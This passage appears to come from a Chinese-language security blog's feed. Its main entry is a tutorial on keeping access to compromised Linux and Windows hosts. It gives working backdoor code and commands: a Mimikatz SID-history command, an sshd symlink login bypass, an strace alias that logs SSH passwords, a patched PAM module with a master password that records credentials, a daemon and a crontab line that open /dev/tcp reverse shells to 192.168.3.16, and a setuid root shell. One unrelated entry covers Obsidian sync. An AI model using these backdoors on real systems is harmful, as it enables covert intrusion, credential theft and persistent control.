得了域管理员权限，则可以将SID History作为实现持久化的方法。</p></blockquote><p>就是用于鉴定权限的东西，然后我们可以使用给sid 添加迁移之后继续保持该权限，而不是重新的新的权限的关键字。从而实现持久性获取，但是该方法需要管理员权限</p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><ol><li><p>域控上添加并且启用账户</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">dsadd <span class="hljs-keyword">user</span> <span class="hljs-title">cn</span>=ttttest,<span class="hljs-attr">dc=</span>august,<span class="hljs-attr">dc=</span>com -disabled no -pwd <span class="hljs-number">123</span>qweASD@!<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>如果发现不行，也可以尝试直接使用域控上面现成的普通域用户</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217152358390.png" alt="image-20240217152358390"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217152450425.png" alt="image-20240217152450425"></p></li><li><p>Mimikatz添加后门</p></li></ol>   <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">privilege:</span>:debug<br><span class="hljs-symbol">sid:</span>:patch<br><span class="hljs-symbol">sid:</span>:<span class="hljs-keyword">add</span> /sam:jhon /new:administrator  <span class="hljs-meta"># 将administrator 的sid 给jhon</span><br></code></pre></td></tr></table></figure><p>   然后就有administrator 的sid 了</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217153048960.png" alt="image-20240217153048960"></p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>24_2_16知识回顾</title>
    <link href="/2024/02/17/%E5%9B%9E%E9%A1%BE/24-2-16%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE/"/>
    <url>/2024/02/17/%E5%9B%9E%E9%A1%BE/24-2-16%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="windwos-权限维持"><a href="#windwos-权限维持" class="headerlink" title="windwos 权限维持"></a>windwos 权限维持</h1><ol><li>修改注册表的辅助程序  修改对应的debugger 的值<br>  或者修改为运行完某个程序执行payload （我们指定的程序）</li><li>msf 联合 使用粘滞键运行其他程序</li><li>对于注册表需要对给用户添加权限</li><li>msf 可以使用autorunscript<br> 在上线的时候就进行迁移进程<br> 使用-n 来指定进程的名字</li><li>注册表自启动</li><li>定时任务</li><li>隐藏用户<br> 使用$ 作为结尾，然后想要该用户不在net user和控制面板里面出现就可以使用administrator 替换该用户的rid </li><li>创建服务的方式</li></ol><h1 id="linux-权限维持"><a href="#linux-权限维持" class="headerlink" title="linux 权限维持"></a>linux 权限维持</h1><ol><li>ssh 相关<ul><li>公私钥</li><li>起别名的ssh  从而记录用户的输入</li><li>软连接ssh</li></ul></li><li>起别名<br> 起一个多个命令复合的<br> 比如 alias cat&#x3D;’bash -c &gt;&amp; &#x2F;edv&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;1&amp;;cat’</li><li>pam  后门程序<br> 就是添加固定密码登录所有的用户</li><li>定时任务<br> Crontab</li><li>setuid  setgid<br> 可以实现提权<br> 我们可以将我们自己的脚本设置为这个，然后运行这个，可以获取root 权限</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>回顾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>obsidion多端同步实现</title>
    <link href="/2024/02/16/others/obsidion%E5%A4%9A%E7%AB%AF%E5%90%8C%E6%AD%A5%E5%AE%9E%E7%8E%B0/"/>
    <url>/2024/02/16/others/obsidion%E5%A4%9A%E7%AB%AF%E5%90%8C%E6%AD%A5%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>首先感谢ob 和 腾讯云cos </p><p>个人使用了 坚果云和 onedrive 但是效果都不是很好，看到大佬推荐腾讯云 就尝试使用cos </p><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><ol><li><p>创建桶</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217001819530.png" alt="image-20240217001819530"></p><p>其余的就一直下一步</p></li><li><p>创建子用户</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217001906624.png" alt="image-20240217001906624"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217002007859.png" alt="image-20240217002007859"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217002020314.png" alt="image-20240217002020314"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217002029590.png" alt="image-20240217002029590"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217002048223.png" alt="image-20240217002048223"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217002106596.png" alt="image-20240217002106596"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217002149613.png" alt="image-20240217002149613"></p><p>不给权限，直接下一步</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217002230304.png" alt="image-20240217002230304"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217002319859.png" alt="image-20240217002319859"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217002351331.png" alt="image-20240217002351331"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">app:<span class="hljs-regexp">//</span>obsidian.md<br>capacitor:<span class="hljs-regexp">//</span>localhost<br>http:<span class="hljs-regexp">//</span>localhost<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217002429912.png" alt="image-20240217002429912"></p><p>记得点击保存</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217002445519.png" alt="image-20240217002445519"></p><p>cos 步骤完成</p></li><li><p>obsidian</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240217002726843.png" alt="image-20240217002726843"></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>others</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux权限维持</title>
    <link href="/2024/02/16/%E6%B8%97%E9%80%8F/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    <url>/2024/02/16/%E6%B8%97%E9%80%8F/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<h1 id="SSH后门"><a href="#SSH后门" class="headerlink" title="SSH后门"></a>SSH后门</h1><h2 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ln -sf <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/sshd /</span>tmp<span class="hljs-regexp">/su;/</span>tmp/su -oport=<span class="hljs-number">12345</span>  <span class="hljs-comment"># -oport 的意思是监听端口</span><br>ssh root@<span class="hljs-number">192.168</span>.<span class="hljs-number">78.19</span> -p <span class="hljs-number">1234</span>su<br></code></pre></td></tr></table></figure><blockquote><p>输入任意密码就可以 root 用户权限登陆，如果 root 用户被禁止登陆时，可以利用其他存在的用户身份登陆</p></blockquote><blockquote><p><a href="https://www.cnblogs.com/likaiming/p/11007919.html">Linux的一个后门引发对PAM的探究 - 番茄汁汁 - 博客园 (cnblogs.com)</a></p></blockquote><p>该方式可以实现免密的登录</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216161709771.png" alt="image-20240216161709771"></p><p>发现这这个su 的help 是sshd的，因为我们使用的软链接</p><p>然后我们的主机就可以使用ssh 任意密码就可以实现登录了</p><h2 id="ssh-key"><a href="#ssh-key" class="headerlink" title="ssh key"></a>ssh key</h2><ol><li><p>生成公钥和私钥</p><p>我们主机运行</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure><p>  把公钥id_rsa.pub发送到目标authorized_keys文件中  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216163648231.png" alt="image-20240216163648231"></p><p>可以先将这个临时放入一个文件，然后将这个文件上传到受害者的机器上，然后将内容导入到authorized_keys</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ls <span class="hljs-regexp">/root/</span>.ssh/authorized_keys<br></code></pre></td></tr></table></figure></li><li><p>然后重启ssh 服务</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">service ssh restart</span><br></code></pre></td></tr></table></figure></li><li><p>接下来就可以免密登录了</p></li></ol><h2 id="SSH-Keylogger"><a href="#SSH-Keylogger" class="headerlink" title="SSH Keylogger"></a>SSH Keylogger</h2><p>编辑当前用户下的.bashrc文件，在配置文件末尾添加：  </p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">alias ssh=&#x27;strace -o /tmp/sshpwd-`date +<span class="hljs-built_in">%d</span><span class="hljs-built_in">%h</span><span class="hljs-built_in">%m</span><span class="hljs-built_in">%s</span>`.log -e <span class="hljs-keyword">read</span>,<span class="hljs-keyword">write</span>,connect -s2048 ssh&#x27;<br></code></pre></td></tr></table></figure><p>strace 常用来跟踪进程执行时的系统调用和所接收的信号。 在Linux世界，进程不能直接访问硬件设  备，当进程需要访问硬件设备(比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至  内核态模式，通过系统调用访问硬件设备。strace可以跟踪到一个进程产生的系统调用,包括参数，返  回值，执行消耗的时间。  </p><p>SSH连接输入密码时的密码无论错误或者正确都能记录到log里。</p><p>然后访问这个文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216164543289.png" alt="image-20240216164543289"></p><p>就可以发现其他人的输入的密码</p><h1 id="Linux-PAM-后门"><a href="#Linux-PAM-后门" class="headerlink" title="Linux PAM 后门"></a>Linux PAM 后门</h1><p>PAM这个模块用于检测ssh 登录时，用于检测密码是否正确</p><p>我们可以在PAM 安装后门 </p><ol><li><p>安装环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install -y gcc flex<br></code></pre></td></tr></table></figure></li><li><p>修改源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim Linux-PAM-1.1.8/modules/pam_unix/pam_unix_auth.c<br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">:<span class="hljs-keyword">set</span> <span class="hljs-built_in">number</span><br><span class="hljs-number">181</span>G<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216170339632.png" alt="image-20240216170339632"></p><p>添加内容</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;august&quot;</span>,p)==<span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">return</span> PAM_SUCCESS;&#125;<br></code></pre></td></tr></table></figure><p>august 时设置的密码</p><p>依次执行</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd Linux-PAM-1.1.8<br><br>./configure <span class="hljs-attribute">--prefix</span>=/user <span class="hljs-attribute">--exec-prefix</span>=/usr <span class="hljs-attribute">--localstatedir</span>=/var <span class="hljs-attribute">--sysconfdir</span>=/etc --disable-selinux <span class="hljs-attribute">--with-libiconv-prefix</span>=/usr<br><br>make<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">so文件路径：Linux-PAM-<span class="hljs-number">1.1</span>.<span class="hljs-number">8</span><span class="hljs-regexp">/modules/</span>pam_unix<span class="hljs-regexp">/.libs/</span>pam_unix.so<br></code></pre></td></tr></table></figure></li><li><p>替换受害者的文件</p><ul><li><p>查看文件在哪里</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">find / -name pam_unix.so 2&gt;/dev/null<br></code></pre></td></tr></table></figure></li><li><p>备份原来的文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cp</span> /lib/x86_64-linux-gnu/security/pam_unix.so /tmp/pam_unix.so.bak<br></code></pre></td></tr></table></figure></li><li><p>替换系统的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp /root/桌面/Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so<br><br></code></pre></td></tr></table></figure></li></ul></li><li><p>修改时间戳</p></li></ol>   <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /lib/x86_64-linux-gnu/security/<br><span class="hljs-built_in">touch</span> pam_unix.so -r pam_xauth.so <span class="hljs-comment"># &lt;参考文件或目录&gt;  把指定文件或目录的日期时间，统统设成和参考文件或目录的日期时间相同；</span><br></code></pre></td></tr></table></figure><ol start="5"><li><p>登录</p><p>接下来无论密码是什么都可以使用august登录</p></li><li><p>优化</p><p>查看日志文件：&#x2F;var&#x2F;log&#x2F;auth.log，发现这种方式下的登录跟正常登录下的情况不一样</p><blockquote><p>  修改Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;pam_unix_auth.c  </p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">        <span class="hljs-comment">/* verify the password of this user */</span><br>        retval = _unix_verify_password(pamh, name, p, ctrl);<br><span class="hljs-comment">//      if (strcmp(&quot;mingyue&quot;,p)==0) &#123;return PAM_SUCCESS;&#125;</span><br>        FILE * fp;<br>        <span class="hljs-keyword">if</span> (retval == PAM_SUCCESS) &#123;<br>          fp = fopen(<span class="hljs-string">&quot;/etc/pam.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>          <span class="hljs-built_in">fprintf</span>(fp,<span class="hljs-string">&quot;%s-&gt;%s\n&quot;</span>, name,p);<br>          fclose(fp);<br>        &#125;<br>        name = p = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><blockquote><p>修改Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;support.c  </p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> _unix_verify_password(<span class="hljs-type">pam_handle_t</span> * pamh, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name<br>                          ,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *p, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ctrl)<br>&#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">passwd</span> *pwd = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-type">char</span> *salt = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-type">char</span> *data_name;<br>        <span class="hljs-type">int</span> retval;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;mingyue2&quot;</span>,p)==<span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">return</span> PAM_SUCCESS;&#125;<br><br>        <span class="hljs-built_in">D</span>((<span class="hljs-string">&quot;called&quot;</span>));<br></code></pre></td></tr></table></figure><p>  然后编译生成so文件，替换系统pam_unix.so文件即可。</p></li></ol><h1 id="Alias后门"><a href="#Alias后门" class="headerlink" title="Alias后门"></a>Alias后门</h1><blockquote><p>  通过alias来指定执行特定的命令时候静默运行其他程序，从而达到启动后门，记录键值等作用。  </p></blockquote><p>  修改ssh命令，利用strace，使其具有记录ssh对read,write,connect调用的功能。  </p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">alias ssh=&#x27;strace -o /tmp/sshpwd-`date +<span class="hljs-built_in">%d</span><span class="hljs-built_in">%h</span><span class="hljs-built_in">%m</span><span class="hljs-built_in">%s</span>`.log -e <span class="hljs-keyword">read</span>,<span class="hljs-keyword">write</span>,connect -s2048 ssh&#x27;<br></code></pre></td></tr></table></figure><ul><li><p>反弹shell  </p><p>alias cat&#x3D;’&#x2F;root&#x2F;.shell &amp;&amp; cat’</p></li></ul>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERR_EXIT(m) do&#123;perror(m); exit(EXIT_FAILURE);&#125;while (0);</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">creat_daemon</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">time_t</span> t;<br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-built_in">creat_daemon</span>();<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/rm /bin/sh;/bin/ln -s /bin/bash /bin/sh&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.3.16/8008 0&gt;&amp;1&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">creat_daemon</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">int</span> devnullfd,fd,fdtablesize;<br>    <span class="hljs-built_in">umask</span>(<span class="hljs-number">0</span>);<br><br>    pid = fork();<br>    <span class="hljs-keyword">if</span>( pid == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">ERR_EXIT</span>(<span class="hljs-string">&quot;fork error&quot;</span>);<br>    <span class="hljs-keyword">if</span>(pid &gt; <span class="hljs-number">0</span> )<br>        <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">setsid</span>() == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">ERR_EXIT</span>(<span class="hljs-string">&quot;SETSID ERROR&quot;</span>);<br>    <span class="hljs-built_in">chdir</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><br>    <span class="hljs-comment">/* close any open file descriptors */</span><br>    <span class="hljs-keyword">for</span>(fd = <span class="hljs-number">0</span>, fdtablesize = <span class="hljs-built_in">getdtablesize</span>(); fd &lt; fdtablesize; fd++)<br>        <span class="hljs-built_in">close</span>(fd);<br><br>    devnullfd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* make STDIN ,STDOUT and STDERR point to /dev/null */</span><br>    <span class="hljs-keyword">if</span> (devnullfd == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">ERR_EXIT</span>(<span class="hljs-string">&quot;can&#x27;t open /dev/null&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">dup2</span>(devnullfd, STDIN_FILENO) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">ERR_EXIT</span>(<span class="hljs-string">&quot;can&#x27;t dup2 /dev/null to STDIN_FILENO&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">dup2</span>(devnullfd, STDOUT_FILENO) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">ERR_EXIT</span>(<span class="hljs-string">&quot;can&#x27;t dup2 /dev/null to STDOUT_FILENO&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">dup2</span>(devnullfd, STDERR_FILENO) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">ERR_EXIT</span>(<span class="hljs-string">&quot;can&#x27;t dup2 /dev/null to STDOUT_FILENO&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">signal</span>(SIGCHLD,SIG_IGN);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Crontab后门"><a href="#Crontab后门" class="headerlink" title="Crontab后门"></a>Crontab后门</h1><p>定时任务后门</p><p>每分钟反弹一次shell给指定ip的8888端口  </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">(crontab -l;echo &#x27;*/1 * * * * exec 9&lt;&gt; /dev/tcp/192.168.3.16/<span class="hljs-number">8888</span>;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&#x27;)<span class="hljs-string">|crontab -</span><br><br></code></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>.服务开启<br>service crond <span class="hljs-literal">start</span><br><br><span class="hljs-number">2</span>.编辑计划任务<br>crontab -e -u 用户名<br><br><span class="hljs-number">3</span>.查看计划任务<br>crontab -l -u 用户名<br><br><span class="hljs-number">4</span>.删除计划任务：<br>crontab -r -u 用户名<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#相关文件</span><br><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>用户名   <span class="hljs-comment">#用户定义的设置</span><br><span class="hljs-regexp">/var/</span>log/cron            <span class="hljs-comment">#cron服务的日志文件</span><br><span class="hljs-regexp">/etc/</span>crontab             <span class="hljs-comment">#cron服务配置文件</span><br></code></pre></td></tr></table></figure><h1 id="Setuid-amp-Setgid"><a href="#Setuid-amp-Setgid" class="headerlink" title="Setuid &amp; Setgid"></a>Setuid &amp; Setgid</h1><h2 id="Setuid"><a href="#Setuid" class="headerlink" title="Setuid"></a>Setuid</h2><p>  设置使文件在执行阶段具有文件所有者的权限. 典型的文件是 &#x2F;usr&#x2F;bin&#x2F;passwd. 如果一般用户执行  该文件， 则在执行过程中， 该文件可以获得root权限， 从而可以更改用户的密码.  </p><h2 id="Setgid"><a href="#Setgid" class="headerlink" title="Setgid"></a>Setgid</h2><p>  该权限只对目录有效.  目录被设置该位后， 任何用户在此目录下创建的文件都具有和该目录所属的组  相同的组.  </p><blockquote><p>  back.c  </p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    setuid(<span class="hljs-number">0</span>);<br>    setgid(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(argc &gt; <span class="hljs-number">1</span>)<br>        execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, argv[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">else</span><br>        execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># 编译程序</span><br>gcc <span class="hljs-keyword">back</span>.c -o <span class="hljs-keyword">back</span><br>cp <span class="hljs-keyword">back</span> /bin/<br><br><span class="hljs-comment"># 给程序添加SUID权限</span><br>chmod u+s /bin/<span class="hljs-keyword">back</span><br></code></pre></td></tr></table></figure><h1 id="后门账号"><a href="#后门账号" class="headerlink" title="后门账号"></a>后门账号</h1><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 